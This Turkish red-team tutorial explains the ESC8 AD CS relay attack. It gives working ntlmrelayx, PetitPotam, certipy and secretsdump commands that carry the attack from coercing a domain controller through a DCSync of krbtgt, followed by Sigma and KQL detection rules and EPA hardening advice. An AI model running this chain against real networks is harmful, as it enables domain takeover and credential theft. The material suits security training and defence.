## 1. Kavramsal Temel — Neden Var?

**ESC8**, iki güçlü zayıflığın kesişimidir: (1) AD CS'in **Web Enrollment** arayüzü (`http://ca/certsrv/`) varsayılan olarak **HTTP + NTLM** kimlik doğrulaması kabul eder ve genellikle **EPA (Extended Protection for Authentication) kapalıdır**; (2) [koersiyonla](./08.2_PetitPotam_PrinterBug_DFSCoerce.md) bir DC'yi bu HTTP arayüzüne auth etmeye **zorlayabilirsin**. Bu ikisi birleşince: DC'yi zorla → auth'unu CA Web Enrollment'a relay et → **DC adına sertifika al**. Bu sertifika DC'nin kimliğidir; PKINIT ile DC'nin TGT/hash'ine, oradan **DCSync ve domain hakimiyetine** dönüşür.

**Analoji:** CA, "kimliğini ispatla, sana pasaport basayım" diyen bir pasaport ofisidir. ESC8'de kurbanın (DC'nin) kimlik ispatını *ortada yakalayıp* ofise sen taşırsın; ofis pasaportu (sertifikayı) DC adına basar ama **sana** teslim eder. Artık DC'nin pasaportu cebindedir.

**Neden en kritik relay hedefi:** Diğer relay hedefleri (SMB/LDAP) genellikle *bir makinede* ayrıcalık verir. ESC8, doğrudan **Tier-0'a (DC kimliği)** çıkar ve sonuç bir **sertifikadır** — parola değişse bile sertifika ömrü boyunca (çoğu şablon 1-2 yıl) geçerli kalır. Bu yüzden aynı zamanda **kalıcılık** vektörüdür → [Red 07.4](../Modul_07_AD_CS_PKI_Saldirilari/07.4_ForgeCert_ve_Sertifika_Kaliciligi.md).

## 2. Teknik Derinlik — ESC8 Akışı

ESC8, [08.1'deki HTTP→? relay](./08.1_NTLM_Relay_Senaryolari.md) modelinin AD CS'e özelleşmiş halidir. Hedef, CA'nın HTTP enrollment endpoint'idir:

```
                        ┌──── ntlmrelayx --adcs --template DomainController ────┐
 KOERSIYON               │                                                      │
 (PetitPotam -pipe all)  ▼                                                      ▼
 DC01 ──HTTP auth(DC01$)──▶ SALDIRGAN ──relay──▶ http://CA01/certsrv/certfnsh.asp
                                                        │
                              CA, DC01$ adına sertifika imzalar (PKCS#10 → PKCS#7)
                                                        │
                                                        ▼
                              ntlmrelayx Base64 PFX'i yakalar (DC01$ sertifikası)
```

**Neden HTTP kaynağı şart:** CA Web Enrollment **HTTP**'dir. SMB koersiyonundan gelen auth SMB imzalamayla korunur; ama HTTP auth **imza taşımaz**. Bu yüzden [08.2'deki WebDAV/`@80` HTTP koersiyonu](./08.2_PetitPotam_PrinterBug_DFSCoerce.md) kullanılır. HTTP endpoint'te **EPA açıksa** (kanal bağlama), relay edilen auth CA'nın TLS kanalına bağlanmadığı için reddedilir → ESC8 kapanır ([Blue 8.1](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.1_LDAP_Signing_ve_Channel_Binding.md)).

**Sertifika istek alanları (CSR/PKCS#10):** `ntlmrelayx --template DomainController`, DC'ler için geçerli varsayılan şablonu seçer. Bu şablonun EKU'su `Client Authentication` + `Server Authentication` içerir; PKINIT için `Client Authentication` yeterlidir. CA, isteği relay edilen `DC01$` bağlamında değerlendirir ve Subject/SAN'ı DC01$'a bağlar.

**Sertifika → hash dönüşümü (PKINIT + UnPAC):**
```
DC01$ PFX ──▶ certipy auth ──▶ AS-REQ (PKINIT, sertifikayla) ──▶ AS-REP
                                        │
                        TGT + PAC (NTLM hash UnPAC ile çıkar) ──▶ DC01$ NT hash
                                        │
                        DC01$ = DC makine hesabı ──▶ DCSync yetkisi ──▶ krbtgt
```

**Endpoint varyantları:** `/certsrv/certfnsh.asp` (klasik Web Enroll), `/certsrv/certrqxt.asp`, ayrıca **CES/CEP** (Certificate Enrollment Web Service, `https://.../ADPolicyProvider_CEP_Kerberos/service.svc`) HTTPS+relay için ayrı yüzeydir.

**EPA neden ESC8'i kapatır (kanal bağlama derinliği):** Web Enrollment HTTPS ise, EPA açıkken sunucu istemciden NetNTLMv2 yanıtının `MsvAvChannelBindings` alanında **TLS kanalının `cbData` hash'ini** bekler. Kurban (DC) bu hash'i kendi TLS oturumuna göre hesaplar; saldırgan yanıtı CA'ya relay ederken kendi TLS kanalı **farklı** olduğundan hash uyuşmaz → `403.16`/kanal hatası. EPA kapalıysa CA bu alanı hiç doğrulamaz → relay geçer. Bu yüzden [Blue 8.1](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.1_LDAP_Signing_ve_Channel_Binding.md) IIS'te `Extended Protection = Required` ayarını ESC8'in tek gerçek panzehiri olarak vurgular.

**Şablon seçimi mantığı:** `--template DomainController` yerine hedefe göre şablon değişir: bir **kullanıcı** relay edilirse `--template User`, bir **web sunucusu** ise `Machine`. Şablonun **Client Authentication EKU**'su içermesi PKINIT için şarttır; içermezse sertifika alınır ama Kerberos auth'a çevrilemez (yalnızca imzalama/şifreleme). Certipy `find` çıktısı, hangi şablonun enrollee'ye açık olduğunu gösterir → [Red 07.1](../Modul_07_AD_CS_PKI_Saldirilari/07.1_ESC1_ESC8_Somuru_Teknikleri.md).

## 3. Pratik Uygulama — Çok Araçlı

**A) ESC8 relay dinleyicisi (Impacket ntlmrelayx):**
```bash
# CA Web Enrollment'a relay; DC şablonuyla sertifika iste
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController
# HTTPS CA / CES için:
impacket-ntlmrelayx -t https://ca01.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
```

**B) Koersiyonla DC'yi tetikle (HTTP kaynağı):**
```bash
python3 PetitPotam.py -pipe all ATTACKER_IP@80/x DC01_IP        # WebDAV/HTTP
# veya
coercer coerce -u user -p pass -d corp.local -l ATTACKER_IP@80 -t DC01_IP
```

**C) Certipy tek-komut ESC8 (relay dahili):**
```bash
# Certipy kendi relay sunucusunu kaldırır
certipy relay -target http://ca01.corp.local -template DomainController
# Ardından ayrı terminalde koersiyon tetikle
```

**D) Sertifika → DC hash → DCSync:**
```bash
# Yakalanan DC01$ PFX ile PKINIT auth
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10
# Çıktı: DC01$ NT hash + TGT (.ccache)
# DC makine hesabıyla DCSync:
impacket-secretsdump 'corp.local/DC01$@dc01.corp.local' -hashes :<DC01$_NThash> -just-dc-user krbtgt
```

**Örnek çıktı:**
```
[*] SMBD-Thread-4: Connection from CORP/DC01$ controlled, relaying...
[*] Authenticating against http://ca01.corp.local as CORP/DC01$ SUCCEED
[*] Generating CSR...
[*] Requesting certificate for user 'DC01$' via template 'DomainController'
[*] Base64 certificate of user DC01$: MIIRcQIBAzC...
[*] Certificate successfully written to file DC01.pfx
```

**Gerçek-dünya zinciri:**
```
ntlmrelayx --adcs --template DomainController   (dinle)
        +
PetitPotam -pipe all ATTACKER@80 DC01           (zorla)
        ▼
DC01.pfx ──▶ certipy auth ──▶ DC01$ hash/TGT ──▶ secretsdump DCSync ──▶ krbtgt ──▶ Golden Ticket ──▶ 🏁 domain
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Kaynak İz (IOC) | Karşı Blue |
|---|---|---|---|
| ESC8 relay | **T1557 + T1649** (Steal/Forge Cert) | CA'da 4886/4887 talep; `DC01$` adına istenmemiş sertifika; kaynak IP ≠ DC | [Blue 8.1](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.1_LDAP_Signing_ve_Channel_Binding.md) · [Blue 7.x AD CS](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/) |
| Sertifika → PKINIT auth | T1550 | 4768 PKINIT (Cert Info dolu); olağandışı `DC01$` TGT | [Blue 6.x Kerberos](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/) |
| DCSync (DC hash sonrası) | T1003.006 | 4662 replication GUID; DsGetNCChanges | [Blue 10.2](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.2_KRBTGT_Cift_Reset_ve_Ticket_Gecersizlestirme.md) |

**OPSEC notları:**
- **En net iz:** CA denetiminde (4886 — "Certificate Services received request") `DC01$` gibi bir makine hesabının **DomainController şablonuyla ve saldırgan IP'sinden** sertifika istemesi. DC'ler kendi sertifikalarını autoenrollment ile *kendi IP'lerinden* alır.
- **Sertifika kalıcılığı:** Alınan sertifika CA veritabanında kalır; Blue tarafı `certutil -view` ile listeler ve **iptal (revoke)** eder. Saldırgan bunu bilir ve sertifikayı hızlı kullanır (kısa pencere).
- **EPA/HTTPS zorlanmışsa** relay `401`/kanal bağlama hatasıyla düşer — hedef seçimi kritik. `certutil -config CA -ping` ile enrollment yüzeyi keşfedilir.
- İz azaltma yok sayılmamalı: bu zincir domain'i düşürür ama **çok gürültülüdür**; kırmızı takım raporunda "yüksek tespit edilebilirlik" olarak işaretlenir.
- **Sertifika iptali (revocation) bypass'ı yoktur:** Blue sertifikayı iptal etse bile, PKINIT için CRL/OCSP kontrolü çoğu KDC yapılandırmasında **zorunlu değildir** → iptal edilmiş sertifika hâlâ TGT alabilir. Bu yüzden gerçek panzehir iptal değil, **strong mapping + EPA**'dır ([Blue 7.x](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/)).

**PKINIT ↔ NTLM köprüsü (UnPAC-the-Hash):** `certipy auth`, PKINIT ile TGT aldıktan sonra, PAC içindeki `PAC_CREDENTIAL_INFO` yapısından hesabın **NT hash'ini** de çıkarır (UnPAC). Yani ESC8, sadece Kerberos bileti değil, doğrudan **DC01$ NT hash'i** de verir → hem PtH hem DCSync mümkün olur. Bu, sertifika-tabanlı saldırının parola-değişiminden bağımsız gücünü artırır.

## 5. Doğrulama / Lab

```bash
# Lab: CA (Web Enroll açık, EPA kapalı) + DC + saldırgan
# 1) impacket-ntlmrelayx -t http://ca01/certsrv/certfnsh.asp --adcs --template DomainController
# 2) PetitPotam.py -pipe all ATTACKER@80 DC01
# 3) DC01.pfx üretimini + certipy auth ile hash çıkımını doğrula
# Blue doğrulama (CA talep denetimi):
Get-WinEvent -LogName 'Security' -FilterXPath "*[System[EventID=4886]]" |
  Where-Object { $_.Message -match '\$' }   # makine hesabı talepleri
```

**Sigma kuralı (ESC8 — makine hesabı DC şablonu talebi, yabancı IP):**
```yaml
title: Potential ESC8 - Machine Account Cert Request via Relay
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 4886            # Certificate Services received request
    Requester|endswith: '$'  # makine hesabı
  selection_tmpl:
    EventID: 4887            # Certificate Services approved and issued
    Attributes|contains: 'DomainController'
  condition: selection and selection_tmpl
level: critical
```

**KQL (PKINIT ile alınan olağandışı DC TGT — sertifika sonrası):**
```kusto
SecurityEvent
| where EventID == 4768 and CertificateThumbprint != ""   // PKINIT
| where TargetUserName endswith "$"
| where IpAddress !in (dynamic(["<DC IP listesi>"]))       // DC dışı kaynak
| project TimeGenerated, TargetUserName, IpAddress, CertificateThumbprint
```

**EPA doğrulama testi (savunma çalışıyor mu):**
```bash
# EPA açıksa relay 403.16 / kanal hatası ile düşer:
certipy relay -target http://ca01 -template DomainController
#   [-] Got error: 401 / channel binding token mismatch  ← EPA çalışıyor (Blue 8.1 başarılı)
```
